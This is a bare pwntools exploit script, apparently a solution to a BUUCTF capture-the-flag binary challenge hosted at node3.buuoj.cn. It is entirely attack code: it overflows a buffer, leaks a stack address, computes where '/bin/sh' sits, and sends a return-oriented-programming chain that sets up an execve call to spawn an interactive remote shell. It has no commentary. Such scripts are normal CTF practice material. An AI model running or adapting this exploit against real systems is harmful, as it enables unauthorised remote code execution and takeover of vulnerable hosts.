from pwn import *
context.arch='amd64'
r=remote("node3.buuoj.cn",26478)
payload='/bin/sh\x00'*2+p64(0x4004ED)
r.sendline(payload)
r.recv(0x20)
stack_addr=u64(r.recv(8))
r.recv(8)
bin_sh=stack_addr-0x118
payload='/bin/sh\x00'*2+flat([0x40059A,0,0,bin_sh+0x50,0,0,0,0x400580,0x4004e2,0x4005a3,bin_sh,0x400501])
r.sendline(payload)
r.recv(0x30)
r.interactive()
